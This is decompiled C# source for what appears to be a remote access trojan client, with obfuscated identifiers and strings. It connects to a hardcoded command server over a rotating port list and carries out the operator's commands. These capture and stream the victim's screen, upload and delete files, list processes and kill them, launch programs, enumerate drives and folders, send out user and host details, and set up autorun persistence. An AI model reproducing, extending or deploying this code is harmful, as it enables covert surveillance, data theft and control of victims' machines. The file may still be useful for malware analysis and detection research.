using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace aphmasnvs;

public class MCUDM
{
	private int aphmasnvsbuffSize = 1024;

	private DRUIVF aphmasnvsHD = new DRUIVF();

	public bool aphmasnvsis_working = false;

	private bool aphmasnvsiswitch = false;

	private bool aphmasnvsthrRuning = false;

	public int port_sn = 0;

	private Dictionary<string, byte[]> aphmasnvstasks = new Dictionary<string, byte[]>();

	public DateTime aphmasnvsrunTime;

	private int aphmasnvsbytesRead = 0;

	public bool aphmasnvsreqCnls = false;

	public bool aphmasnvsautCnls = false;

	public DateTime aphmasnvslTimeUtc;

	private THURE aphmasnvsStateObj = new THURE();

	private bool aphmasnvsstr_writer = false;

	private MYUINF aphmasnvsUPC;

	private OCUMD aphmasnvsCMD;

	private int aphmasnvsscrSize = 200;

	private ThreadStart aphmasnvsfunStarter;

	public TcpClient aphmasnvstcpsck;

	public NetworkStream aphmasnvsnetStream;

	private bool aphmasnvscapScreen = false;

	private Thread aphmasnvsfunThread;

	public void aphmasnvsdou_start()
	{
		COUNF.aphmasnvsport = COUNF.ports[0];
		aphmasnvsrunTime = DateTime.Now;
		aphmasnvsUPC = new MYUINF();
		aphmasnvsCMD = new OCUMD(this);
		aphmasnvsHD.iserver = this;
		aphmasnvsHD.aphmasnvsmainPath = COUNF.aphmasnvsget_mpath();
		TimerCallback callback = aphmasnvslookupCons;
		Timer aphmasnvstimer = new Timer(callback, aphmasnvsStateObj, 32110, 36110);
		aphmasnvsStateObj.aphmasnvstimer = aphmasnvstimer;
	}

	public string aphmasnvsfiule_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|aphmasnvs".Split(new char[1] { '|' })[0] : "<|aphmasnvs".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|aphmasnvs".Split(new char[1] { '|' })[0] : "<|aphmasnvs".Split(new char[1] { '|' })[0]);
			text = text + aphmasnvsgeut_size(fileInfo.Length) + ((!ret) ? ">|aphmasnvs".Split(new char[1] { '|' })[0] : "<|aphmasnvs".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				aphmasnvspuush_data(null, "aphmasnvs-fiulsz=|aphmasnvs".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void aphmasnvschueckLastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(aphmasnvsrunTime.Subtract(mTimeUtc).Minutes);
			if (num > 5)
			{
				aphmasnvstcpsck.Close();
				aphmasnvsis_working = false;
			}
		}
		catch
		{
		}
	}

	public void aphmasnvssauveFile(string filePath)
	{
		try
		{
			byte[] bytes = aphmasnvspuull_data();
			File.WriteAllBytes(filePath, bytes);
		}
		catch
		{
		}
	}

	public bool aphmasnvsISuCnfs()
	{
		try
		{
			COUNF.aphmasnvsdefaultP = Encoding.UTF8.GetString(COUNF.aphmasnvsvpsips, 0, COUNF.aphmasnvsvpsips.Length);
			aphmasnvstcpsck = new TcpClient();
			aphmasnvstcpsck.Connect(COUNF.aphmasnvsdefaultP, COUNF.aphmasnvsport);
			return true;
		}
		catch
		{
			try
			{
				port_sn++;
				COUNF.aphmasnvsport = COUNF.ports[port_sn];
				if (port_sn >= COUNF.ports.Length - 1)
				{
					port_sn = 0;
				}
			}
			catch
			{
				port_sn = 0;
			}
			return false;
		}
	}

	private void aphmasnvslookupCons(object dource)
	{
		try
		{
			if (!aphmasnvsthrRuning)
			{
				aphmasnvsthrRuning = true;
				aphmasnvschueckLastatime(DateTime.Now);
				if (!aphmasnvsis_working || !aphmasnvstcpsck.Connected)
				{
					aphmasnvsis_working = aphmasnvsISuCnfs();
					if (aphmasnvsis_working)
					{
						aphmasnvsbuffSize = aphmasnvstcpsck.ReceiveBufferSize;
						aphmasnvsseueResp();
					}
				}
			}
			aphmasnvsthrRuning = false;
		}
		catch
		{
			aphmasnvsthrRuning = false;
			aphmasnvsstr_writer = false;
			aphmasnvsis_working = false;
			aphmasnvsiswitch = false;
		}
	}

	public bool aphmasnvsseund_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				aphmasnvspuush_data(data, "aphmasnvs-afuile=" + fileinfo);
				return false;
			}
			aphmasnvspuush_data(null, "aphmasnvs-anufod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void aphmasnvsliust_processes(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|aphmasnvs".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|aphmasnvs".Split(new char[1] { '|' })[0];
				text += "0>|aphmasnvs".Split(new char[1] { '|' })[0];
				text += "<";
			}
			byte[] data = COUNF.getuByteuArray(text);
			aphmasnvspuush_data(data, "aphmasnvs-" + cmd + "=pruess|aphmasnvs".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void aphmasnvslouad_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			Thread.Sleep(10);
			COUNF.aphmasnvsset_run("mdhdroa|aphmasnvs".Split(new char[1] { '|' })[0], executablePath);
		}
		catch
		{
		}
	}

	private void aphmasnvsimuage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ">|aphmasnvs".Split(new char[1] { '|' })[0];
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|aphmasnvs".Split(new char[1] { '|' })[0];
			text = text + aphmasnvsgeut_size(fileInfo.Length) + ">";
			MemoryStream memoryStream = new MemoryStream();
			((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
			aphmasnvspuush_data(memoryStream.ToArray(), "aphmasnvs-thuumb=|aphmasnvs".Split(new char[1] { '|' })[0] + text);
		}
		catch
		{
		}
	}

	private void aphmasnvsseue_scren(string screnize)
	{
		try
		{
			SCURNS sCURNS = new SCURNS();
			aphmasnvsscrSize = Convert.ToInt16(screnize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = sCURNS.aphmasnvsscreen(aphmasnvsscrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				aphmasnvspuush_data(memoryStream.ToArray(), "aphmasnvs-sauscr=cauuen|aphmasnvs".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void aphmasnvsisu_screen(string scrnSize)
	{
		try
		{
			SCURNS sCURNS = new SCURNS();
			aphmasnvsscrSize = Convert.ToInt16(scrnSize.Split(new char[1] { '>' })[0].Trim());
			while (aphmasnvscapScreen && aphmasnvsis_working)
			{
				Bitmap val = sCURNS.aphmasnvsscreen(aphmasnvsscrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					aphmasnvspuush_data(memoryStream.ToArray(), "aphmasnvs-scuren=caucreen|aphmasnvs".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void aphmasnvsusueur_inufo()
	{
		string text = aphmasnvsUPC.aphmasnvslancard + "|" + aphmasnvsUPC.aphmasnvscname + "|" + aphmasnvsUPC.aphmasnvsuname + "|" + aphmasnvsUPC.aphmasnvsuip + "|" + COUNF.aphmasnvsOsname() + "|" + aphmasnvsUPC.aphmasnvsapver + "|";
		text += "| !aphmasnvs".Split(new char[1] { '!' })[0];
		text = text + "|" + aphmasnvsUPC.aphmasnvsclientNum;
		text = text + "|" + COUNF.aphmasnvsget_mpath();
		byte[] data = COUNF.getuByteuArray(text);
		aphmasnvspuush_data(data, "aphmasnvs-inufo=usuer|aphmasnvs".Split(new char[1] { '|' })[0]);
	}

	private void aphmasnvsscrueenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			aphmasnvsscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void aphmasnvspuush_file(string lfile)
	{
		try
		{
			string fileName = Path.GetFileName(lfile);
			aphmasnvspuush_data(File.ReadAllBytes(lfile), "aphmasnvs-fiule=|aphmasnvs".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
		}
		catch
		{
		}
	}

	private string aphmasnvsgeut_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|aphmasnvs".Split(new char[1] { '|' })[0],
				"KB|aphmasnvs".Split(new char[1] { '|' })[0],
				"MB|aphmasnvs".Split(new char[1] { '|' })[0],
				"GB|aphmasnvs".Split(new char[1] { '|' })[0],
				"TB|aphmasnvs".Split(new char[1] { '|' })[0],
				"PB|aphmasnvs".Split(new char[1] { '|' })[0],
				"EB|aphmasnvs".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "1";
		}
	}

	public string[] aphmasnvsgeut_command()
	{
		try
		{
			byte[] array = new byte[5];
			aphmasnvsbytesRead = aphmasnvsnetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= aphmasnvsbytesRead)
			{
				int count = ((num3 > aphmasnvsbuffSize) ? aphmasnvsbuffSize : num3);
				aphmasnvsbytesRead = aphmasnvsnetStream.Read(array2, num2, count);
				num2 += aphmasnvsbytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			aphmasnvsis_working = false;
			return null;
		}
	}

	private void aphmasnvsliustDrives()
	{
		string text = aphmasnvsHD.aphmasnvslouokup_Drive();
		aphmasnvspuush_data(null, "aphmasnvs-diurs=" + text);
	}

	private void aphmasnvsseueResp()
	{
		if (!aphmasnvsiswitch)
		{
			aphmasnvsiswitch = true;
			aphmasnvsnetStream = aphmasnvsCMD.aphmasnvsNS(aphmasnvstcpsck);
			aphmasnvscapScreen = false;
			while (aphmasnvsis_working)
			{
				string[] switchType = aphmasnvsgeut_command();
				if (switchType != null)
				{
					aphmasnvsreqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("aphmasnvs-" + text) : ("aphmasnvs-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "aphmasnvs-pruocl":
					case "aphmasnvs-procl":
						aphmasnvsfunStarter = delegate
						{
							aphmasnvsliust_processes("pruocl");
						};
						aphmasnvsfunThread = new Thread(aphmasnvsfunStarter);
						aphmasnvsfunThread.Start();
						break;
					case "aphmasnvs-geutavs":
					case "aphmasnvs-getavs":
						aphmasnvsfunStarter = delegate
						{
							aphmasnvsliust_processes("geutavs");
						};
						aphmasnvsfunThread = new Thread(aphmasnvsfunStarter);
						aphmasnvsfunThread.Start();
						break;
					case "aphmasnvs-thuumb":
					case "aphmasnvs-thumb":
						aphmasnvsimuage_info(switchType[1]);
						break;
					case "aphmasnvs-cluping":
					case "aphmasnvs-clping":
						aphmasnvsrunTime = DateTime.Now;
						break;
					case "aphmasnvs-puutsrt":
					case "aphmasnvs-putsrt":
						aphmasnvslouad_app();
						break;
					case "aphmasnvs-fiulsz":
					case "aphmasnvs-filsz":
						aphmasnvsfunStarter = delegate
						{
							aphmasnvsfiule_info(switchType[1]);
						};
						aphmasnvsfunThread = new Thread(aphmasnvsfunStarter);
						aphmasnvsfunThread.Start();
						break;
					case "aphmasnvs-ruupth":
					case "aphmasnvs-rupth":
						aphmasnvspuush_data(null, "aphmasnvs-apupth=|aphmasnvs".Split(new char[1] { '|' })[0] + COUNF.aphmasnvsget_mpath());
						break;
					case "aphmasnvs-douwf":
					case "aphmasnvs-dowf":
						aphmasnvssauveFile(switchType[1]);
						break;
					case "aphmasnvs-enudpo":
					case "aphmasnvs-endpo":
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						}
						catch
						{
						}
						break;
					case "aphmasnvs-scursz":
					case "aphmasnvs-scrsz":
						aphmasnvsscrueenSize(switchType[1]);
						break;
					case "aphmasnvs-csucreen":
					case "aphmasnvs-cscreen":
						aphmasnvsseue_scren(switchType[1]);
						break;
					case "aphmasnvs-diurs":
					case "aphmasnvs-dirs":
						aphmasnvsfunThread = new Thread(aphmasnvsliustDrives);
						aphmasnvsfunThread.Start();
						break;
					case "aphmasnvs-stuops":
					case "aphmasnvs-stops":
						aphmasnvscapScreen = false;
						break;
					case "aphmasnvs-scuren":
					case "aphmasnvs-scren":
						aphmasnvscapScreen = true;
						aphmasnvsfunStarter = delegate
						{
							aphmasnvsisu_screen(switchType[1]);
						};
						aphmasnvsfunThread = new Thread(aphmasnvsfunStarter);
						aphmasnvsfunThread.Start();
						break;
					case "aphmasnvs-cnuls":
					case "aphmasnvs-cnls":
						aphmasnvsautCnls = true;
						aphmasnvsreqCnls = true;
						aphmasnvscapScreen = false;
						break;
					case "aphmasnvs-udult":
					case "aphmasnvs-udlt":
						aphmasnvsCMD.aphmasnvsremove_user();
						break;
					case "aphmasnvs-deult":
					case "aphmasnvs-delt":
						File.Delete(switchType[1]);
						break;
					case "aphmasnvs-afuile":
					case "aphmasnvs-afile":
						aphmasnvsfunStarter = delegate
						{
							aphmasnvsseund_auto(switchType[1]);
						};
						aphmasnvsfunThread = new Thread(aphmasnvsfunStarter);
						aphmasnvsfunThread.Start();
						break;
					case "aphmasnvs-liustf":
					case "aphmasnvs-listf":
						aphmasnvsfunStarter = delegate
						{
							aphmasnvsHD.aphmasnvslouok_File(switchType[1]);
						};
						aphmasnvsfunThread = new Thread(aphmasnvsfunStarter);
						aphmasnvsfunThread.Start();
						break;
					case "aphmasnvs-fiule":
					case "aphmasnvs-file":
						aphmasnvsfunStarter = delegate
						{
							aphmasnvspuush_file(switchType[1]);
						};
						aphmasnvsfunThread = new Thread(aphmasnvsfunStarter);
						aphmasnvsfunThread.Start();
						break;
					case "aphmasnvs-inufo":
					case "aphmasnvs-info":
						aphmasnvsfunThread = new Thread(aphmasnvsusueur_inufo);
						aphmasnvsfunThread.Start();
						break;
					case "aphmasnvs-ruunf":
					case "aphmasnvs-runf":
						Process.Start(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "aphmasnvs-flues":
					case "aphmasnvs-fles":
					{
						string files = aphmasnvsHD.aphmasnvslouokup_File(switchType[1]);
						if (files != null)
						{
							aphmasnvsfunStarter = delegate
							{
								aphmasnvspuush_data(null, "aphmasnvs-flues=|aphmasnvs".Split(new char[1] { '|' })[0] + files);
							};
							aphmasnvsfunThread = new Thread(aphmasnvsfunStarter);
							aphmasnvsfunThread.Start();
						}
						break;
					}
					case "aphmasnvs-douwr":
					case "aphmasnvs-dowr":
						aphmasnvssauveFile(switchType[1]);
						break;
					case "aphmasnvs-fludr":
					case "aphmasnvs-fldr":
					{
						string Folders = aphmasnvsHD.aphmasnvschueck_Folder(switchType[1]);
						if (Folders != null)
						{
							aphmasnvsfunStarter = delegate
							{
								aphmasnvspuush_data(null, "aphmasnvs-fludr=|aphmasnvs".Split(new char[1] { '|' })[0] + Folders);
							};
							aphmasnvsfunThread = new Thread(aphmasnvsfunStarter);
							aphmasnvsfunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				aphmasnvsis_working = false;
				break;
			}
			aphmasnvsis_working = false;
			aphmasnvscapScreen = false;
		}
		aphmasnvsiswitch = false;
	}

	public byte[] aphmasnvspuull_data()
	{
		try
		{
			aphmasnvsrunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			aphmasnvsbytesRead = aphmasnvsnetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !aphmasnvsreqCnls)
			{
				int count = ((num3 > aphmasnvsbuffSize) ? aphmasnvsbuffSize : num3);
				aphmasnvsbytesRead = aphmasnvsnetStream.Read(array2, num, count);
				num += aphmasnvsbytesRead;
				num3 -= aphmasnvsbytesRead;
				aphmasnvsrunTime = DateTime.Now;
			}
			if (aphmasnvsreqCnls)
			{
				aphmasnvsnetStream.Flush();
				while (aphmasnvsnetStream.DataAvailable && aphmasnvsnetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			aphmasnvsis_working = false;
			return null;
		}
	}

	public bool aphmasnvspuush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			aphmasnvsrunTime = DateTime.Now;
			if (aphmasnvsstr_writer)
			{
				return false;
			}
			aphmasnvsstr_writer = true;
			byte[] array = COUNF.getuByteuArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array2 = null;
			if (data != null)
			{
				array2 = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(array.Length);
			byte[] array3 = new byte[num2 + array.Length + num];
			bytes.CopyTo(array3, 0);
			array.CopyTo(array3, 5);
			if (data != null)
			{
				array2.CopyTo(array3, 5 + array.Length);
				data.CopyTo(array3, 10 + array.Length);
			}
			int num3 = 0;
			int num4 = array3.Length;
			while (num4 > 0 && !aphmasnvsreqCnls)
			{
				int num5 = ((num4 > aphmasnvsbuffSize) ? aphmasnvsbuffSize : num4);
				aphmasnvsnetStream.Write(array3, num3, num5);
				num3 += num5;
				num4 -= num5;
				aphmasnvsrunTime = DateTime.Now;
			}
			aphmasnvsstr_writer = false;
			if (aphmasnvsreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			aphmasnvsstr_writer = false;
			aphmasnvsis_working = false;
			return false;
		}
	}
}
